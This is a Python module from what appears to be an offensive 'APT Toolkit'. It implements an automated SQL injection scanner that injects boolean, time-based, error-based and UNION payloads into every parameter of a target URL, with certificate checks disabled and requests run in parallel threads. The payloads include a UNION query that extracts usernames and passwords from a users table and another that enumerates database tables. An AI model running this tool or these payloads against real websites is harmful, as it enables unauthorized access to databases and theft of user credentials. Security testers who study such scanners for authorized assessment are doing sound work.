"""
SQL Injection Module for APT Toolkit

Features:
- SQL injection detection
- Multiple attack techniques
- Payload generation
- Result analysis
- Thread-safe operation
"""

import time
import random
import threading
from typing import Dict, List, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor
from enum import Enum, auto
import requests
from urllib.parse import urljoin

from src.core.engine import ScanModule, ScanTarget, ScanResult, ScanStatus
from src.utils.logger import get_logger
from src.utils.network import NetworkHelpers
from src.utils.config import config
from src.core.event_system import event_system, Event
from src.utils.helpers import ErrorHelpers

logger = get_logger(__name__)

class InjectionType(Enum):
    """SQL injection types"""
    BOOLEAN = auto()
    TIME_BASED = auto()
    ERROR_BASED = auto()
    UNION = auto()

class SQLInjector(ScanModule):
    """SQL injection testing module"""
    
    def __init__(self):
        super().__init__()
        self.module_name = "sql_injector"
        self.timeout = config.web.request_timeout
        self.max_threads = config.web.max_threads
        self.payloads = self._load_payloads()
        self._stop_event = threading.Event()
        
    def _load_payloads(self) -> Dict[InjectionType, List[str]]:
        """Load SQL injection payloads"""
        return {
            InjectionType.BOOLEAN: [
                "' OR 1=1 --",
                "' OR 'a'='a",
                "\" OR \"\"=\""
            ],
            InjectionType.TIME_BASED: [
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))abc) --",
                "' OR IF(1=1,SLEEP(5),0) --"
            ],
            InjectionType.ERROR_BASED: [
                "' AND GTID_SUBSET(CONCAT(0x7178787171,(SELECT (ELT(1=1,1))),0x7178787171),1) --",
                "' AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT @@version),0x3a)) --"
            ],
            InjectionType.UNION: [
                "' UNION SELECT null,CONCAT(username,0x3a,password) FROM users --",
                "' UNION SELECT null,table_name FROM information_schema.tables --"
            ]
        }
        
    def initialize(self) -> None:
        """Initialize injector resources"""
        logger.info(f"Initialized {self.module_name} with {self.max_threads} threads")
        
    def cleanup(self) -> None:
        """Cleanup injector resources"""
        self._stop_event.set()
        logger.info(f"Cleaned up {self.module_name}")
        
    def validate_target(self, target: ScanTarget) -> bool:
        """Validate target is appropriate for SQL injection testing"""
        if not target.host:
            return False
        return target.host.startswith(('http://', 'https://'))
        
    def _test_injection(self, url: str, params: Dict[str, str], payload: str, injection_type: InjectionType) -> Tuple[bool, Dict[str, Any]]:
        """Test a single injection payload"""
        result = {
            "vulnerable": False,
            "type": injection_type.name,
            "payload": payload,
            "response_time": 0,
            "response_code": 0,
            "response_length": 0,
            "errors": []
        }
        
        try:
            # Prepare test data
            test_params = params.copy()
            for k in test_params:
                test_params[k] += payload
                
            start_time = time.time()
            response = requests.get(
                url,
                params=test_params,
                timeout=self.timeout,
                allow_redirects=False,
                verify=False
            )
            elapsed = time.time() - start_time
            
            result.update({
                "response_time": elapsed,
                "response_code": response.status_code,
                "response_length": len(response.content)
            })
            
            # Detection logic based on injection type
            if injection_type == InjectionType.TIME_BASED:
                result["vulnerable"] = elapsed >= 5
            elif injection_type == InjectionType.ERROR_BASED:
                result["vulnerable"] = "SQL syntax" in response.text
            else:  # BOOLEAN and UNION
                original_response = requests.get(
                    url,
                    params=params,
                    timeout=self.timeout,
                    allow_redirects=False,
                    verify=False
                )
                result["vulnerable"] = (
                    response.status_code != original_response.status_code or
                    response.text != original_response.text
                )
                
        except requests.exceptions.RequestException as e:
            result["errors"].append(str(e))
        except Exception as e:
            logger.error(f"Injection test failed: {str(e)}")
            result["errors"].append(str(e))
            
        return result["vulnerable"], result
        
    def _scan_endpoint(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Scan a single endpoint for SQL injection vulnerabilities"""
        results = []
        
        for injection_type, payloads in self.payloads.items():
            if self._stop_event.is_set():
                break
                
            for payload in payloads:
                if self._stop_event.is_set():
                    break
                    
                vulnerable, result = self._test_injection(url, params, payload, injection_type)
                results.append(result)
                
                if vulnerable:
                    logger.info(f"Found SQLi vulnerability at {url} with payload: {payload}")
                    return results  # Early exit if vulnerability found
                    
        return results
        
    def execute(self, target: ScanTarget) -> ScanResult:
        """
        Execute SQL injection testing against target
        
        Args:
            target: ScanTarget specifying URL and parameters
            
        Returns:
            ScanResult with injection test results
        """
        if not self.validate_target(target):
            logger.error(f"Invalid scan target: {target.host}")
            return ScanResult(
                target=target,
                data={"error": "Invalid target"},
                status=ScanStatus.FAILED
            )
            
        url = target.host
        params = target.metadata.get("params", {})
        
        logger.info(f"Starting SQL injection testing on {url}")
        
        try:
            results = []
            vulnerable = False
            
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                futures = []
                
                # Test URL parameters
                for param in params:
                    if self._stop_event.is_set():
                        break
                        
                    test_params = {k: "" for k in params}
                    test_params[param] = params[param]
                    futures.append(executor.submit(self._scan_endpoint, url, test_params))
                    
                # Process results
                for future in futures:
                    if self._stop_event.is_set():
                        break
                        
                    try:
                        endpoint_results = future.result()
                        results.extend(endpoint_results)
                        if any(r["vulnerable"] for r in endpoint_results):
                            vulnerable = True
                            break  # Stop if vulnerability found
                    except Exception as e:
                        logger.error(f"SQLi test failed: {str(e)}")
                        
            return ScanResult(
                target=target,
                data={
                    "vulnerable": vulnerable,
                    "results": results,
                    "stats": {
                        "tests_performed": len(results),
                        "vulnerable_params": len([r for r in results if r["vulnerable"]]),
                        "types_tested": list(set(r["type"] for r in results))
                    }
                },
                status=ScanStatus.COMPLETED
            )
            
        except Exception as e:
            logger.error(f"SQL injection testing failed on {target.host}: {str(e)}", exc_info=True)
            return ScanResult(
                target=target,
                data={"error": str(e)},
                status=ScanStatus.FAILED
            )

# Module registration
def init_module():
    return SQLInjector()

# Example usage:
# injector = SQLInjector()
# target = ScanTarget(
#     host="http://example.com/login.php",
#     metadata={"params": {"username": "test", "password": "test"}}
# )
# result = injector.execute(target)
# print(json.dumps(result.data, indent=2))